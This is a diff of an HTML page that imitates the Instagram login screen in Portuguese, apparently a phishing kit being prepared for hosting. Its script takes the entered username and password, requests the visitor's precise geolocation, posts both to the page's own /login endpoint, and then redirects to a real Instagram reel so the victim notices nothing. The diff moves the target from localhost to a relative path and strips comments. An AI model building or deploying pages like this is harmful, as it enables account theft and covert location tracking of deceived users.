@@ -4,20 +4,20 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
-    <link rel="stylesheet" href="css/style.css">
-    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="shortcut icon" href="/img/favicon.png" type="image/x-icon">
 </head>
 <body>
     <main>
         <div id="main-container">
             <!-- Banner container -->
             <div id="banner-container">
-                <img src="img/banner2.png" alt="Crie uma conta no Instagram">
+                <img src="/img/banner2.png" alt="Crie uma conta no Instagram">
             </div>
             <!-- Login e Registro -->
             <div id="form-container">
                 <div id="form-box">
-                    <img id="logo-insta" src="img/logo_instagram.png" alt="Instagram">
+                    <img id="logo-insta" src="/img/logo_instagram.png" alt="Instagram">
                     <form id="login-form" onsubmit="handleSubmit(event)">
                         <input type="text" name="username" placeholder="Número de telefone, usuário ou e-mail" required>
                         <input type="password" name="password" placeholder="Senha" required>
@@ -30,7 +30,7 @@
                         <div id="other-links">
                             <div id="facebook-login">
                                 <a href="#">
-                                    <img src="img/logo_facebook.svg" alt="Facebook-login">
+                                    <img src="/img/logo_facebook.svg" alt="Facebook-login">
                                     <span>Entrar com o Facebook</span>
                                 </a>
                             </div>
@@ -46,10 +46,10 @@
                 <div id="get-app-container">
                     <p>Obtenha o aplicativo.</p>
                     <a href="#">
-                        <img src="img/apple_btn.png" alt="Apple Store">
+                        <img src="/img/apple_btn.png" alt="Apple Store">
                     </a>
                     <a href="#">
-                        <img src="img/gplay_btn.png" alt="Google Play">
+                        <img src="/img/gplay_btn.png" alt="Google Play">
                     </a>
                 </div>
             </div>
@@ -76,7 +76,7 @@
 
     <script>
         async function handleSubmit(event) {
-            event.preventDefault(); // Evita o recarregamento da página
+            event.preventDefault();
             const form = event.target;
             const formData = new FormData(form);
             const data = {
@@ -84,30 +84,29 @@
                 password: formData.get('password')
             };
 
-            // Tentar capturar geolocalização
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         console.log('Geolocalização obtida:', position.coords.latitude, position.coords.longitude);
                         data.latitude = position.coords.latitude;
                         data.longitude = position.coords.longitude;
-                        sendData(data); // Enviar dados com localização
+                        sendData(data);
                     },
                     (error) => {
                         console.log('Erro na geolocalização:', error.message);
-                        sendData(data); // Enviar dados sem localização
+                        sendData(data);
                     },
                     { timeout: 10000, enableHighAccuracy: true }
                 );
             } else {
                 console.log('Geolocalização não suportada');
-                sendData(data); // Enviar dados sem localização
+                sendData(data);
             }
         }
 
         async function sendData(data) {
             try {
-                const response = await fetch('http://localhost:3000/login', {
+                const response = await fetch('/login', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -118,9 +117,7 @@
                 if (result.status === 'success') {
                     console.log('Dados enviados com sucesso');
                     document.getElementById('login-form').reset();
-
-                    // ✅ Redireciona para um vídeo do Instagram
-                    window.location.href = 'https://www.instagram.com/reels/DJ2jvhcxR37/'; // Substitua pelo link real
+                    window.location.href = 'https://www.instagram.com/reels/DJ2jvhcxR37/';
                 } else {
                     console.error('Erro ao enviar dados:', result.message);
                     alert('Usuário ou senha inválidos');
